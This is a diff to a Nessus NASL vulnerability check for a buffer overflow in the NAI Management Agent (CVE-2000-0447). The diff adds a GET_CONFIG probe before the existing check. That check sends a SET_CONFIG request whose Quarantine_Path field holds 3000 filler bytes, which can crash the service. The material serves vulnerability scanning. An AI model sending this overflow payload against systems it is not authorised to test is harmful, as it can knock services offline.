@@ -6,8 +6,8 @@
 if(description)
 {
   script_id(10425);
- script_version ("$Revision: 1.11 $");
- script_bugtraq_id(1254);
+  script_bugtraq_id(1254);
+ script_version ("$Revision: 1.13 $");
   script_cve_id("CVE-2000-0447");
   name["english"] = "NAI Management Agent overflow";
   script_name(english:name["english"]);
@@ -66,9 +66,19 @@ if(get_port_state(port))
    soc = open_sock_tcp(port);
    if(soc)
    {
+     req = string("GET_CONFIG\r\n");
+     send(socket:soc, data:req);
+     r = recv(socket:soc, length:2048);
+     if ( ! r ) exit(0);
+     close(soc);
+
+     soc = open_sock_tcp(port);
+     if ( ! soc ) exit(0);
+
      req = string("SET_CONFIG\r\nQuarantine_Path='", crap(3000), "'\r\n\r\n");
      send(socket:soc, data:req);
      r = recv(socket:soc, length:2048);
+     if ( ! r ) exit(0);
      close(soc);
      sleep(2);
      
